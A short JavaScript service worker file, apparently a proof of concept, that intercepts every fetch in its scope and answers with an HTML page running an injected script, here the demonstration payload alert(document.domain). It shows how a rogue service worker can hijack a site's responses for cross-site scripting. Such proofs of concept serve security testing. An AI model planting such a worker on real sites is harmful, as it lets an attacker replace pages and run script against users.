// sw.js
self.addEventListener("fetch", e => {
  e.respondWith(
    new Response(`<script>alert(document.domain)</script>`, {
      headers: { "Content-Type": "text/html" }
    })
  );
});
